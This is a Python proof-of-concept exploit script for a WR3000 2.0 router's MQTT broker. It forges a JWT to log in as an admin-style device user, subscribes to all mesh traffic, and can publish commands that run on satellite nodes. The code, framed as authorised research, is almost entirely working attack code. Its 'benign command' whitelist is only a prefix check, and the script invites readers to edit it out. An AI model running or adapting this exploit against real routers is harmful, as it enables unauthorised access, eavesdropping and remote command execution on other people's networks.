#!/usr/bin/env python3
"""
mqtt_takeover.py — authenticate to a WR3000 2.0 Mosquitto broker with a
forged JWT (CVE-2026-71960) and exercise the mesh command interface
(CVE-2026-71961 — only with --cmd, against hardware you own).

Default behaviour is passive: CONNECT, subscribe, print traffic, exit.
Nothing is published unless you explicitly pass --cmd, and the default
cmd is 'id' (harmless proof of execution).

Usage:
    python3 mqtt_takeover.py --host 192.168.10.1 --port 1883 \
        --deviceid 012345678901 --secret '<secret>' [--listen 30]
    python3 mqtt_takeover.py --host ... --secret ... --satellite 098765432109 \
        --cmd 'id'          # demonstrates CVE-2026-71961 (your own device!)

Requires: paho-mqtt  (pip install paho-mqtt)
Authorised research only.
"""
import argparse
import sys
import threading
import time

from forge_jwt import forge

TOPIC_MESH_ALL = "router/#"
CMD_TOPIC_FMT = "router/{controller}/{satellite}/router/command"


def on_connect(client, userdata, flags, rc, props=None):
    if rc == 0:
        print("[+] CONNACK rc=0 — broker accepted the forged JWT")
        client.subscribe(userdata["subscribe"])
        print(f"[+] subscribed: {userdata['subscribe']}  (acl_check allows all)")
    else:
        print(f"[!] CONNACK rc={rc} — rejected")
        userdata["failed"] = True


def on_message(client, userdata, msg):
    body = msg.payload.decode(errors="replace")
    print(f"[msg] {msg.topic}: {body[:400]}")
    if '"data"' in body and "uid=" in body:
        print("[+] command output received — CVE-2026-71961 chain complete")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=1883)
    ap.add_argument("--deviceid", required=True, help="target deviceid")
    ap.add_argument("--secret", required=True, help="bdinfo secret")
    ap.add_argument("--subscribe", default=TOPIC_MESH_ALL)
    ap.add_argument("--satellite", help="deviceid of a satellite to command")
    ap.add_argument("--cmd", default=None,
                    help="command string for command.lua (CVE-2026-71961). "
                         "Implies --satellite. Use ONLY on hardware you own.")
    ap.add_argument("--listen", type=int, default=20, help="seconds to listen")
    args = ap.parse_args()

    import paho.mqtt.client as mqtt
    token = forge(args.deviceid, args.secret)
    username = f"admincudydevice-{args.deviceid}"
    print(f"[*] CONNECT {args.host}:{args.port} user={username}")

    userdata = {"subscribe": args.subscribe, "failed": False}
    c = mqtt.Client(client_id="hb-research", protocol=mqtt.MQTTv311)
    c.username_pw_set(username, token)
    c.on_connect = on_connect
    c.on_message = on_message
    c.user_data_set(userdata)
    c.connect(args.host, args.port, keepalive=30)
    c.loop_start()
    time.sleep(2)

    if userdata["failed"]:
        c.loop_stop()
        sys.exit(1)

    if args.cmd:
        if not args.satellite:
            sys.exit("[!] --cmd needs --satellite (the node that will run it)")
        if not args.cmd.startswith(("id", "uname", "echo", "true")):
            print("[!] refusing to run non-benign commands — edit the whitelist "
                  "in your own copy if you truly own the target")
            c.loop_stop()
            sys.exit(1)
        topic = CMD_TOPIC_FMT.format(controller=args.deviceid,
                                     satellite=args.satellite)
        payload = '{"cmd": "%s"}' % args.cmd
        print(f"[*] publishing (CVE-2026-71961): {topic} {payload}")
        c.publish(topic, payload)

    print(f"[*] listening {args.listen}s …")
    time.sleep(args.listen)
    c.loop_stop()
    print("[*] done")


if __name__ == "__main__":
    main()
